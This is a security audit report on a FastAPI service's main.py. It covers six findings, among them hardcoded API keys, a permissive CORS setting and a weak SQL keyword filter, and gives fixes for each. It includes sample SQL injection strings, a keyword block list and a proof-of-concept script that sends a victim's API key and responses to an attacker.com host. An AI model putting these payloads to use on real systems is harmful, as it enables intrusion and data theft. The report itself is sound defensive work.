# Phase 2 Security Vulnerabilities: main.py

**Copyright © 2025 Herbert Velez Jr. All rights reserved.**  
**Proprietary and Confidential.**

---

## Audit Summary

**File:** `core/source_proprietary/main.py`  
**Lines Audited:** 1-1250 (of 3220 total) - **39% complete**  
**Vulnerabilities Found:** **6 issues** (3 CRITICAL, 2 HIGH, 1 MEDIUM)  
**Status:** AUDIT IN PROGRESS - Fixing required before continuing

---

## ⚠️ CRITICAL VULNERABILITIES (Must Fix Immediately)

### Vulnerability #6: Request Body Consumption Without Restore
**Location:** Lines 215-223 (self_regulation_middleware)  
**Severity:** ⚠️ CRITICAL  
**Type:** Middleware Body Consumption Bug  
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)

**Vulnerable Code:**
```python
# Lines 215-223
if not employee_count and request.method in ["POST", "PUT"]:
    try:
        body = await request.body()  # ⚠️ CONSUMES BODY - NOT RESTORED
        if body:
            body_json = json.loads(body.decode())
            employee_count = body_json.get("employee_count")
    except:
        pass
```

**Impact:**
- ALL POST/PUT endpoints receive empty request bodies
- Pydantic validation fails with "field required" errors on all requests
- API becomes completely non-functional for write operations
- Users cannot invoke clauses, create pilots, or submit any data

**Attack Vector:**
1. Middleware calls `await request.body()` which reads and consumes the stream
2. FastAPI Request.body() can only be read once by default
3. Downstream handlers call `await request.body()` again → returns empty bytes
4. All Pydantic models fail validation
5. API returns 422 Unprocessable Entity on every POST/PUT

**Exploitation Difficulty:** N/A (breaks functionality, not exploitable)

**Fix Strategy:**
Replace body consumption with header-based extraction:
```python
# OPTION 1: Use custom header
employee_count = request.headers.get("X-Employee-Count")

# OPTION 2: Enable body caching (requires receive wrapper)
# See: https://github.com/tiangolo/fastapi/discussions/8271
```

---

### Vulnerability #9: Hardcoded API Keys in Source Code
**Location:** Lines 467-471  
**Severity:** ⚠️ CRITICAL  
**Type:** Hardcoded Secrets  
**CWE:** CWE-798 (Use of Hard-coded Credentials)

**Vulnerable Code:**
```python
# Lines 467-471
VALID_API_KEYS = {
    "dev_test_key_001": {"name": "Development License", "roles": ["read", "invoke"]},
    "ent_prod_key_001": {"name": "Enterprise License", "roles": ["read", "invoke", "admin"]},
    "sov_airgap_key_001": {"name": "Sovereign License", "roles": ["read", "invoke", "admin", "audit"]},
}
```

**Impact:**
- Production API keys exposed in source code
- Keys visible in Git history, Docker images, backups, CI/CD logs
- Anyone with repository access gains full admin privileges
- "admin" role enables `/v1/admin/*` endpoints
- "audit" role accesses sensitive compliance data

**Attack Vector:**
1. Attacker gains read access to repository (leaked credentials, insider threat, supply chain)
2. Extracts `ent_prod_key_001` or `sov_airgap_key_001` from main.py
3. Uses API key to authenticate as Enterprise/Sovereign license holder
4. Executes admin operations, accesses audit logs, modifies compliance data

**Exploitation Difficulty:** TRIVIAL (keys are plaintext in source)

**Fix Strategy:**
```python
# Load from environment variables ONLY
VALID_API_KEYS = {}

def load_api_keys_from_env():
    """Load API keys from environment variables or secrets manager."""
    api_keys_json = os.getenv("MYTHARA_API_KEYS")
    if not api_keys_json:
        logger.error("❌ MYTHARA_API_KEYS not set - API authentication disabled")
        return {}
    
    try:
        return json.loads(api_keys_json)
    except json.JSONDecodeError:
        logger.error("❌ Invalid MYTHARA_API_KEYS JSON format")
        return {}

VALID_API_KEYS = load_api_keys_from_env()
```

---

### Vulnerability #11: SQL Injection via Insufficient Email Validation
**Location:** Lines 1085-1094 (_validate_email function)  
**Severity:** ⚠️ CRITICAL  
**Type:** Insufficient Input Validation + Potential SQL Injection  
**CWE:** CWE-89 (SQL Injection)

**Vulnerable Code:**
```python
# Lines 1091-1094
# Block SQL injection patterns
if any(danger in email.lower() for danger in ["drop", "select", "insert", "delete", "';", "--"]):
    return False
return True
```

**Impact:**
- Email validation only blocks 6 SQL keywords
- If database layer uses string concatenation (not parameterized queries), allows SQL injection
- Attacker can execute arbitrary SQL through email parameter
- Can exfiltrate database contents, modify pilot records, escalate privileges

**Attack Vector (if database.py uses string concatenation):**
```python
# Bypass keyword filter with advanced SQL injection
email = "admin@example.com' UNION ALL SELECT api_key,email,domain FROM pilots--"
email = "user@test.com'; UPDATE pilots SET strikes=0 WHERE email='attacker@evil.com"
email = "test@site.com' AND 1=1 WAITFOR DELAY '00:00:05'--"  # Time-based blind SQLi

# Misses these SQL keywords:
# UPDATE, UNION, EXEC, DECLARE, TRUNCATE, ALTER, CREATE, GRANT, REVOKE
```

**Exploitation Difficulty:** MEDIUM (requires database layer vulnerability)

**Fix Strategy:**
1. **Primary:** Ensure database.py uses parameterized queries ONLY (never string concatenation)
2. **Secondary:** Remove keyword blacklist (ineffective against modern SQLi)
3. **Defense in depth:** Validate email format only, let DB layer handle injection prevention

```python
def _validate_email(email: str) -> bool:
    """Validate email address format only - rely on parameterized queries for SQLi prevention."""
    if not isinstance(email, str):
        return False
    if len(email) > 254 or len(email) < 3:
        return False
    if "\x00" in email or ".." in email:
        return False
    
    # RFC 5322 compliant email regex
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, email))
    
    # DO NOT use keyword blacklists - ineffective against real SQLi
```

---

## ⚠️ HIGH SEVERITY VULNERABILITIES

### Vulnerability #7: Undefined Variable in Error Path (NameError)
**Location:** Line 727 (track_api_usage function)  
**Severity:** 🔴 HIGH  
**Type:** Logic Error - Undefined Variable  
**CWE:** CWE-476 (NULL Pointer Dereference equivalent)

**Vulnerable Code:**
```python
# Line 727 - within track_api_usage()
account["history"].append({
    "timestamp": now.isoformat(),
    "action": action,
    "enforcement": enforcement,
    "call_count": usage["call_count"],
    "days_active": days_since_first,  # ⚠️ UNDEFINED VARIABLE
    "usage_multiplier": usage_multiplier
})
```

**Context:**
```python
# Line 695 - Variable is defined as:
days_since_start = (now - usage["pilot_start_date"]).days + 1

# Line 727 - But referenced as:
"days_active": days_since_first,  # ⚠️ WRONG NAME
```

**Impact:**
- When velocity abuse or usage mismatch detected, code tries to log history
- Python raises `NameError: name 'days_since_first' is not defined`
- Middleware crashes with 500 Internal Server Error
- Stack trace exposed to client (information disclosure)
- Self-regulation system completely bypassed

**Attack Vector:**
1. Attacker exhausts rate limit in < 1 day (velocity abuse trigger)
2. Code reaches line 727 to log strike
3. NameError crashes middleware before strike is recorded
4. Attacker can repeat abuse without strikes accumulating
5. Terminally bypasses self-regulation enforcement

**Exploitation Difficulty:** TRIVIAL (normal API usage triggers it)

**Fix Strategy:**
```python
# Line 727 - Change:
"days_active": days_since_first,
# To:
"days_active": days_since_start,
```

---

### Vulnerability #8: Unsafe CORS Configuration
**Location:** Lines 164-169  
**Severity:** 🔴 HIGH  
**Type:** CORS Misconfiguration  
**CWE:** CWE-942 (Overly Permissive Cross-domain Whitelist)

**Vulnerable Code:**
```python
# Lines 164-169
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],          # ⚠️ WILDCARD ALLOWS ALL ORIGINS
    allow_credentials=True,       # ⚠️ WITH CREDENTIALS ENABLED
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**Impact:**
- CORS spec forbids `allow_origins=["*"]` + `allow_credentials=True`
- Browsers may allow malicious sites to make authenticated requests
- Enables Cross-Site Request Forgery (CSRF) attacks
- Attacker can steal API keys via JavaScript on evil.com
- Session cookies/auth tokens sent to attacker-controlled domains

**Attack Vector:**
```html
<!-- Attacker hosts this on evil.com -->
<script>
fetch('https://mythara-api.com/v1/clauses/invoke', {
    method: 'POST',
    credentials: 'include',  // Send victim's cookies/auth
    headers: {
        'Authorization': 'Bearer ' + localStorage.getItem('api_key'),
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        clause_id: "malicious_clause",
        messenger: "attacker",
        payload: {...},
        consent_token: "forged"
    })
})
.then(r => r.json())
.then(data => {
    // Exfiltrate response to attacker's server
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
</script>
```

**Exploitation Difficulty:** MEDIUM (requires victim to visit attacker's page while authenticated)

**Fix Strategy:**
```python
# OPTION 1: Specify allowed origins explicitly
ALLOWED_ORIGINS = os.getenv("MYTHARA_ALLOWED_ORIGINS", "").split(",")
if not ALLOWED_ORIGINS or ALLOWED_ORIGINS == [""]:
    ALLOWED_ORIGINS = ["https://mythara.com", "https://app.mythara.com"]

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
)

# OPTION 2: Disable credentials for wildcard origins
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,  # Must be False for wildcard
    allow_methods=["*"],
    allow_headers=["*"],
)
```

---

## ⚠️ MEDIUM SEVERITY VULNERABILITIES

### Vulnerability #10: Bare Except Clause Hides Errors
**Location:** Lines 217-223 (self_regulation_middleware)  
**Severity:** 🟡 MEDIUM  
**Type:** Exception Swallowing  
**CWE:** CWE-396 (Declaration of Catch for Generic Exception)

**Vulnerable Code:**
```python
# Lines 217-223
if not employee_count and request.method in ["POST", "PUT"]:
    try:
        body = await request.body()
        if body:
            body_json = json.loads(body.decode())
            employee_count = body_json.get("employee_count")
    except:  # ⚠️ BARE EXCEPT - CATCHES EVERYTHING
        pass
```

**Impact:**
- Catches ALL exceptions including KeyboardInterrupt, SystemExit, MemoryError
- JSON parsing errors silently ignored (no logs, no metrics)
- Invalid UTF-8 encoding silently ignored
- Malformed JSON silently ignored
- Debugging becomes impossible - no visibility into failures

**Attack Vector:**
1. Attacker sends malformed JSON: `{"employee_count": "\x80\x81\x82"}`
2. `json.loads()` raises `json.JSONDecodeError`
3. Exception silently caught, `employee_count` remains None
4. API continues with wrong rate limit tier
5. No logs, no alerts, no metrics - silent failure

**Exploitation Difficulty:** TRIVIAL (send invalid JSON)

**Fix Strategy:**
```python
# Lines 217-223 - Replace with specific exception handling
if not employee_count and request.method in ["POST", "PUT"]:
    try:
        body = await request.body()
        if body:
            body_json = json.loads(body.decode("utf-8"))
            employee_count = body_json.get("employee_count")
    except (json.JSONDecodeError, UnicodeDecodeError) as e:
        # Log specific error for debugging
        logger.warning(f"Failed to parse employee_count from request body: {e}")
        # Fall back to default tier
        employee_count = None
```

---

## Remediation Priority

### Immediate Action Required (CRITICAL):
1. **Fix #6 first:** Request body consumption breaks ALL POST/PUT endpoints
2. **Fix #9:** Remove hardcoded API keys, load from environment
3. **Fix #11:** Verify database.py uses parameterized queries

### High Priority (Within 24 hours):
4. **Fix #7:** Replace `days_since_first` with `days_since_start`
5. **Fix #8:** Configure CORS with explicit origins or disable credentials

### Medium Priority (Within 1 week):
6. **Fix #10:** Replace bare `except:` with specific exception types

---

## Next Steps

1. **Stop current audit** - Fix these 6 vulnerabilities line-by-line
2. **Verify fixes** - Run security_audit_compliance.py again
3. **Resume audit** - Continue reading main.py lines 1250-3220 (61% remaining)
4. **Phase 2 remaining** - Audit database.py, email_service.py, emotional_extortion_detector.py

---

## Audit Metrics

**Progress:**
- Lines audited: 1,250 / 3,220 (39%)
- Vulnerabilities found: 6
- Critical: 3
- High: 2
- Medium: 1
- Total files remaining in Phase 2: 49

**Estimated Time:**
- Fix current vulnerabilities: 2-3 hours
- Complete main.py audit: 4-6 hours
- Phase 2 completion: 12-16 hours

---

**Audit Continues:** Once these 6 vulnerabilities are fixed line-by-line (no patches), will resume reading main.py line 1250 and complete Phase 2.
